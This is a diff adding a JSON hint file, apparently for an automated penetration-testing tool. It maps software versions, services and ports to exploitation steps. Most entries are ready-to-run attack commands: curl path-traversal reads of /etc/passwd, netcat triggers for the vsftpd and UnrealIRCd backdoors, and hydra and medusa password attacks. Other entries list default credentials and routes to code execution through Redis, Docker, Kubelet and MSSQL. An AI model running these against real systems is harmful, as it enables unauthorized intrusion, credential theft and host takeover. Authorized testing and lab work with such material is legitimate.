@@ -1,0 +1,82 @@
+{
+  "version_hints": [
+    ["apache.*2\\.4\\.49", "Apache 2.4.49 → CVE-2021-41773 path traversal/RCE: curl --path-as-is 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'"],
+    ["apache.*2\\.4\\.50", "Apache 2.4.50 → CVE-2021-42013 (incomplete 41773 fix) — same curl path-traversal with .%%32%65 encoding"],
+    ["vsftpd 2\\.3\\.4", "vsftpd 2.3.4 → backdoor RCE: ftp user ending in ':)' then nc TARGET 6200 for a root shell"],
+    ["proftpd 1\\.3\\.5", "ProFTPD 1.3.5 → mod_copy RCE: SITE CPFR/CPTO to copy a webshell into the webroot"],
+    ["proftpd 1\\.3\\.3c", "ProFTPD 1.3.3c → backdoored release: nc TARGET 21, any command via the 'ACIDBITCHES' id vector"],
+    ["samba smbd 3\\.0\\.(20|2[0-5])", "Samba 3.0.20-25 → 'usermap script' CVE-2007-2447 RCE via smbclient login with shell metacharacters in username"],
+    ["samba smbd (3\\.[5-9]|4\\.[0-6])(?!\\d)", "Samba 3.5.0-4.6.4 → SambaCry CVE-2017-7494: writable share + uploaded .so loaded as module = RCE; first find writable shares: smbclient -L //TARGET -N"],
+    ["openssh ([0-6]\\.|7\\.[0-6][^0-9])", "OpenSSH ≤7.6 → username enumeration CVE-2018-15473; build a user list before any password attack"],
+    ["microsoft-iis 6\\.0", "IIS 6.0 → WebDAV CVE-2017-7269 RCE: nuclei -u http://TARGET -tags cve-2017-7269"],
+    ["drupal(?!.*8).*7\\.", "Drupal 7 → Drupalgeddon2 CVE-2018-7600 unauth RCE: nuclei -u http://TARGET -tags drupal"],
+    ["drupal.*8\\.", "Drupal 8 → CVE-2018-7600 / CVE-2019-6340: nuclei -u http://TARGET -tags drupal"],
+    ["joomla.*3\\.[0-7]", "Joomla 3.7 → CVE-2017-8917 SQLi on com_fields: sqlmap -u 'http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1' --batch"],
+    ["grafana (8\\.[0-2])\\.", "Grafana 8.0-8.2 → CVE-2021-43798 path traversal: curl --path-as-is 'http://TARGET:3000/public/plugins/alertlist/../../../../etc/passwd'"],
+    ["openssl 1\\.0\\.1[a-f]?[^0-9g]", "OpenSSL 1.0.1-1.0.1f → Heartbleed CVE-2014-0160: nmap --script=ssl-heartbleed -p443 TARGET"],
+    ["struts|jakarta.*multipart", "Apache Struts2 → CVE-2017-5638 OGNL via Content-Type header: nuclei -u http://TARGET -tags struts"],
+    ["unrealircd 3\\.2\\.8\\.1", "UnrealIRCd 3.2.8.1 → backdoor: nc TARGET 6667 then 'AB; <command>' executes as the ircd user"],
+    ["distccd", "distccd → CVE-2004-2687 unauth RCE: nmap --script=distcc-cve2004-2687 TARGET"],
+    ["miniserv 1\\.(890|920)", "Webmin (miniserv) → CVE-2019-15107 unauth RCE via /password_change.cgi (port 10000)"],
+    ["elasticsearch (0\\.|1\\.[0-4])", "Elasticsearch ≤1.4 → CVE-2015-1427 Groovy script RCE via _search endpoint"],
+    ["apache tomcat.*(8\\.5\\.[0-4]\\d|9\\.0\\.[0-2]\\d)", "Tomcat → if AJP on 8009: Ghostcat CVE-2020-1938 file read/inclusion"]
+  ],
+  "service_hints": [
+    ["samba|smbd|netbios|microsoft-ds", "SMB → enum4linux-ng -A TARGET; smbclient -L //TARGET -N (null session); connect readable shares and hunt for creds/keys"],
+    ["^ftp|ftp ", "FTP → anonymous login (nmap --script=ftp-anon TARGET or anonymous:anonymous); writable dirs + config/backup files often hold creds"],
+    ["openssh", "SSH → password attack only with a real user list: hydra -L users.txt -P WORDLIST ssh://TARGET"],
+    ["mysql|mariadb", "MySQL → default/empty root; hydra mysql TARGET; check remote root and SELECT ... INTO OUTFILE for webshells"],
+    ["microsoft sql server|ms-sql|mssql", "MSSQL → hydra mssql TARGET user sa; if in: xp_cmdshell gives command execution"],
+    ["postgres", "PostgreSQL → default postgres:postgres; COPY ... FROM PROGRAM gives RCE on ≤11.2 as superuser"],
+    ["wordpress", "WordPress → wpscan --url http://TARGET -e ap,u (vulnerable plugins + users); brute wp-login with found users"],
+    ["phpmyadmin", "phpMyAdmin → default creds root:root / root:<blank>; check /phpmyadmin/ directly"],
+    ["tomcat|jenkins", "Tomcat/Jenkins → manager/console default creds (tomcat:s3cret, admin:admin); WAR/Groovy console = RCE"],
+    ["ldap", "LDAP → anonymous bind: ldapsearch -x -H ldap://TARGET -b 'dc=domain,dc=local' — directory dumps leak users and sometimes creds"],
+    ["smtp", "SMTP → user enum: nmap --script=smtp-enum-users TARGET (VRFY/EXPN); open relay test"],
+    ["pop3|imap", "POP3/IMAP → password spray discovered users: hydra -L users.txt -P WORDLIST TARGET pop3"],
+    ["vnc", "VNC → nmap --script=vnc-info TARGET; weak/blank passwords common: medusa -h TARGET -M vnc"],
+    ["rdp|terminal.?services|ms-wbt", "RDP → nmap --script=rdp-ntlm-info TARGET leaks domain/host/users (free recon); old Windows → check BlueKeep via nuclei"],
+    ["telnet", "Telnet → hydra telnet TARGET; also just connect — unauth shells on embedded/legacy gear are common"],
+    ["nfs|rpcbind", "NFS → nmap --script=nfs-ls,nfs-showmount TARGET; mountable exports often expose home dirs/ssh keys"],
+    ["redis", "Redis → likely unauth: printf 'INFO\\r\\n' | nc TARGET 6379; if open, write ssh key via CONFIG SET dir + SAVE"],
+    ["mongodb", "MongoDB → nmap --script=mongodb-info,mongodb-databases TARGET; unauth instances are common in the wild"],
+    ["snmp", "SNMP → nmap --script=snmp-info TARGET (community 'public'); snmp-brute for weak communities — leaks process/user lists"],
+    ["irc", "IRC → connect with nc TARGET 6667; check version (UnrealIRCd backdoor), list channels for info leaks"],
+    ["ajp13", "AJP (8009) → Ghostcat CVE-2020-1938 if Tomcat behind it"]
+  ],
+  "port_hints": {
+    "2375": "Docker API (2375) → curl http://TARGET:2375/version — unauth API = create privileged container, mount host / = RCE",
+    "9200": "Elasticsearch (9200) → curl TARGET:9200/_cat/indices?v — unauth data exposure; old versions → Groovy RCE",
+    "11211": "Memcached (11211) → printf 'stats\\r\\n' | nc TARGET 11211; slab dumps leak session data/creds",
+    "27017": "MongoDB (27017) → unauth check: nmap --script=mongodb-databases TARGET",
+    "6443": "Kubernetes API (6443) → curl -sk https://TARGET:6443/api — anonymous auth or leaked tokens = cluster compromise",
+    "10250": "Kubelet (10250) → curl -sk https://TARGET:10250/pods — unauth kubelet = run commands in any pod",
+    "5601": "Kibana (5601) → check unauth dashboards in browser/curl; pairs with exposed Elasticsearch",
+    "15672": "RabbitMQ mgmt (15672) → default guest:guest at http://TARGET:15672/",
+    "8161": "ActiveMQ console (8161) → default admin:admin; CVE-2016-3088 file upload → webshell",
+    "8983": "Solr (8983) → unauth admin UI; Config API RCE on exposed cores",
+    "4848": "GlassFish admin (4848) → default admin:adminadmin → deploy malicious WAR",
+    "10000": "Webmin (10000) → CVE-2019-15107 unauth RCE via /password_change.cgi on 1.920 and earlier",
+    "8089": "Splunkd (8089) → default admin:changeme on old versions → app upload = RCE"
+  },
+  "wordlists": {
+    "web-dirs": [
+      "/usr/share/seclists/Discovery/Web-Content/common.txt",
+      "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+      "/usr/share/wordlists/dirb/common.txt",
+      "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+    ],
+    "passwords": [
+      "/usr/share/wordlists/rockyou.txt",
+      "/usr/share/seclists/Passwords/Common-Credentials/best1050.txt"
+    ],
+    "usernames": [
+      "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+      "/usr/share/seclists/Usernames/Names/names.txt"
+    ],
+    "subdomains": [
+      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+      "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"
+    ]
+  }
+}
